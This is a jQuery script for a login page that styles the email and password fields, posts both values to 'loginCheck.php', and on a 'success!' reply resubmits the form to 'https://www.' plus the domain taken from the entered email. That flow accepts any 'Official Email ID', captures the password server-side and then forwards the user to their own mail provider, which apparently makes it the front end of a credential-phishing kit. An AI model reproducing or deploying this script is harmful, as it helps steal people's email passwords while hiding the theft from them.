// for login.php page
//--------------------------------------------------------

var user = $('#username');
var pwd = $('#password');
var userIcon = $('#user1');
var pwdIcon = $('#key1');
var spin = $('#spin21');
var unlock = $('#unlock1');
var warning = $('#warning211');
var submit = $('#signIn');


//user id blur and focus functionalities
//--------------------------------------------------------------------------

user.focus(function(){
	user.css({borderColor: "#6c5e6d"});
	user.attr("placeholder", "");
	user.css({color: '#f44523', backgroundColor: '#f4eff1'});
	userIcon.css({color: '#f44523'});
})

user.blur(function(){
	user.attr("placeholder", "Official Email ID");
	user.css({color: '#f4eff1', backgroundColor: '#6c5e6d'});
	userIcon.css({color: '#f4eff1'});
	warning.html("");
})



//password blur and focus functionalities
//--------------------------------------------------------------------------

pwd.focus(function(){
	pwd.css({borderColor: "#6c5e6d"});
	pwd.attr("placeholder", "");
	pwd.css({color: '#f44523', backgroundColor: '#f4eff1'});
	pwdIcon.css({color: '#f44523'});
})

pwd.blur(function(){
	pwd.attr("placeholder", "Password");
	pwd.css({color: '#f4eff1', backgroundColor: '#6c5e6d'});
	pwdIcon.css({color: '#f4eff1'});
	warning.html("");
})




//submit button click, blur and focus functionalities
//--------------------------------------------------------------------------

submit.focus(function(){
	submit.css({backgroundColor: "#bc1e00", borderColor: "#bc1e00"});
})

submit.blur(function(){
	submit.css({backgroundColor: "#f44523", borderColor: "#f44523"});
})

// for keeping check
var val = false;

submit.click(function(){		

	// check if inputs are valid
	if(validate()){
		unlock.css({visibility: "hidden"});   // make unlock symbol hidden
		spin.css({visibility: "visible"});    // let the spin symbol appear

		if(val){
			return true;
		}
		else{
			doit();  		// verify email and password
		}
	}
	return false;
})


// function to validate all entries
//--------------------------------------------------------------------------------

function validate(){

	// get domain
	var domain = user.val().substring(user.val().indexOf('@')+1);

	// change action attribute of the form to domain of the email
	$('#form99').attr('action', 'https://www.'+domain);

	// if the mail is not valid
	if(!validmail()){
		user.css({borderColor: "#e01d1d"});      // change border color
		alert('Invalid Official Mail entry!');   // alert notification
		return false;
	}

	// if password is empty
	if(pwd.val() == ''){
		pwd.css({borderColor: "#e01d1d"});       // change border color
		alert('Please enter the password!');     // alert notification
		return false;
	}
	return true;
}


// function to validate official email entered
//---------------------------------------------------------------


function validmail(){
	var em = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
	if(em.test(user.val()))
		return true;
	return false;
}


// function for verifying email and password
//-------------------------------------------------------------

function doit() {
    var http = new XMLHttpRequest();
	var url = "loginCheck.php";
	var params = "user="+user.val()+"&pass="+pwd.val();
	http.open("POST", url, true);

	//Send the proper header information along with the request
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

	http.onload = function () {
	    // get response from loginCheck.php
	    warning.html(this.responseText);

	    // if credentials are right
	    if(warning.html().endsWith('success!')){
	    	warning.html('');
	    	val = true;
	    	submit.trigger( "click" );
	    }

	    // if credentials are NOT right
	    else{
			unlock.css({visibility: "visible"});
			spin.css({visibility: "hidden"});
			pwd.val('');
		}
	};
	http.send(params);
}